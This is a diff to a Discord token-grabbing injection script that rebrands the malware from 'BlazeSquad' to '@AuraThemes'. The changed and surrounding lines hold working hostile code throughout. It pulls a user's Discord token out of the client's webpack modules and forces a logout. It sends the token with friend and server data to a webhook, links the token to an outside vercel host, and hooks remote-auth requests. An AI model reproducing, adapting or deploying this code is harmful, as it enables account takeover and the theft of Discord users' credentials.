@@ -20,7 +20,7 @@ let [
         `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
         'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
         "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
-        "https://raw.githubusercontent.com/BlazeSquad666/discord-injection/main/injection.js",
+        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
         {
             _nitro: [
                 "<:_:1087043238654906472> ",
@@ -146,11 +146,11 @@ const notify = async (ctx, token, acc) => {
         friends = await getFriends(token),
         servers = await getServers(token);
 
-    ctx.username = "BlazeSquad - Injection";
+    ctx.username = "@AuraThemes - Injection";
     ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
-        name: `Token:`,
+        name: `<a:aura:1087044506542674091> Token:`,
         value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
         inline: false
     })
@@ -470,10 +470,10 @@ session.defaultSession.webRequest.onBeforeRequest(
         ],
     },
     (d, callback) => {
-        if (!fs.existsSync(`${__dirname}/blazesquad`))
-            fs.mkdirSync(`${__dirname}/blazesquad`);
-        if (!fs.existsSync(`${__dirname}/blazesquad/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
-            fs.writeFileSync(`${__dirname}/blazesquad/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
+        if (!fs.existsSync(`${__dirname}/aurathemes`))
+            fs.mkdirSync(`${__dirname}/aurathemes`);
+        if (!fs.existsSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
+            fs.writeFileSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
             execScript(LOGOUT_SCRIPT);
         }
         if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
@@ -632,6 +632,6 @@ const CREATE_WINDOW_CLIENT = (win) => {
     );
 };
 
-CREATE_WINDOW_CLIENT(BrowserWindow);
+CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
 
 module.exports = require("./core.asar");
